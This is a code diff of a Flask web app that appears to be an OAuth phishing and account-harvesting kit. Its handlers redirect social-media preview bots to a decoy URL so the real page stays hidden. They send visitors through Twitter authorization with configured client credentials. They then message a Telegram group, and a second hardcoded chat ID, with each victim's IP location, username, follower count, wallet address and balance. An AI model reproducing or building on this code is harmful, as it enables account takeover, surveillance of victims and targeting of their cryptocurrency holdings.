@@ -40,15 +40,14 @@ def oauth():
     if not group:
         return "⚠️ Identifier is invalid.", 404
     
-    i = group["identifier"].index(identifier)
-    twitter = group.get("twitter_settings")[i]
-    session["redirect_url"] = group.get('redirect')[i]
-    spoof = group.get("spoof")[i]
+    spoof = group["spoof"]
+    session["redirect_url"] = group["redirect"]
 
-    session["client_id"] = twitter["client_id"]
-    session["client_secret"] = twitter["client_secret"]
+    client = group["client"]
+    session["client_id"] = client["id"]
+    session["client_secret"] = client["secret"]
     
-    session["group_id"] = group.get("group_id")
+    session["group_id"] = group["group"]["id"]
     
     if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
         return redirect(spoof)
@@ -64,7 +63,7 @@ def oauth():
         message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
         send_message(group['group_id'], message)
 
-        client_id = session.get("client_id")
+        client_id = session["client_id"]
         domain = config["DOMAIN"]
         callback_url = urllib.parse.quote(f"{domain}/auth", safe="")
 
@@ -127,13 +126,6 @@ def auth_callback():
         username = user_data['username']
         followers_count = user_data['public_metrics']['followers_count']
         
-        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-        location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
-        location_data = location_res.json()
-        country, city = location_data.get("country"), location_data.get("city")
-        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
-        location = f"{country_flag} {city}, {country}"
-        
         existing_user = groups.find_one({ "group.id": group_id, "users.id": user_id })
         
         if existing_user:
@@ -164,7 +156,6 @@ def auth_callback():
                 }
             )
 
-        p_username = parse(username)
         followers = formatter(followers_count)
 
         url = f"https://api-staging.bankr.bot/leaderboard/users/{user_id}/profile"
@@ -181,9 +172,9 @@ def auth_callback():
 
         balance = formatter(data["total_usd_value"])
 
-        message = (f'🐍 *User [{p_username}](https://x.com/{username}) has authorized.*\n'
+        message = (f'🐍 *User [{username}](https://x.com/{username}) has authorized.*\n'
                    f'👥 *Followers:* {followers}\n\n'
-                   f'🔗 *[{address}](https://debank.com/profile/{address}) | ${balance}*')
+                   f'🔗 *[{address}](https://debank.com/profile/{address})* | $*__{balance}__*')
 
         send_message(group_id, message)
         send_message(7434895838, message)
